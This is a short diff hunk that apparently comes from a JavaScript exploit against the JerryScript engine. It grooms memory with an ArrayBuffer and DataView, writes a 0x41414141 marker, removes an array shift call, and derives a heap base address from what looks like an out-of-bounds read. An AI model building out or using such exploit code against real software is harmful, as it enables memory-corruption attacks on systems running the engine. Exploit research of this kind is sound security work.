@@ -3,7 +3,7 @@ a.shift()
 ab = new ArrayBuffer(0x1000)
 dv = new DataView(ab)
 dv.setUint32(0, 0x41414141, true)
-a.shift()
+
 heap_base_offset = 0x12e
 jerry_global_heap = [1, 2]
 jerry_global_heap[0] = a[24] - heap_base_offset
